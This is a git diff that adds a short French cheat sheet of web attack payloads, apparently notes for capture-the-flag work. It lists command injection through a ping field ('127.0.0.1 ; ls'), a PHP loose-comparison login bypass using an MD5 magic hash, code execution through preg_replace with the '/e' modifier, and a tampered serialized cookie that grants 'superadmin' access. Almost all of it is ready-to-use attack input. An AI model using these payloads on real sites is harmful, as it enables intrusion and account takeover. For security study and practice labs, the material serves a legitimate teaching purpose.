@@ -1,0 +1,21 @@
+Si on peut ping dans un champs
+  On tente avec un 127.0.0.1 ; ls ou 127.0.0.1 || ls et après on se ballade avec les commandes linux
+
+Si on pense qu'il y a un fichier de sauvegarde
+  On lance le programme fichierSauvegardePHP.py en modifiant les parametres dans le programme et on croise les doigts
+
+En PHP si l'on ne mets que deux egale il y a des problemes de comparaison on peut tenter le  Loose Comparison
+  ->Si le hash c'est du MD5 on fait login = 0e et password = 240610708 car pour php 0e c'est egale a tout (en gros)
+
+Si il y a un preg-match
+  -> On peut tenter
+    search = /a/e
+    replace = print_r(scandir('.'))
+    content = abcd
+  A adapter en fonction du contexte
+
+Si on voit un cookie avec unserilaize il suffit de remplacer le contenu d'un champ par
+a:2:{s:5:"login";s:5:"guest";s:8:"password";s:64:"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec";}
+a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
+
+b:1; => Ca dit boolean vrai
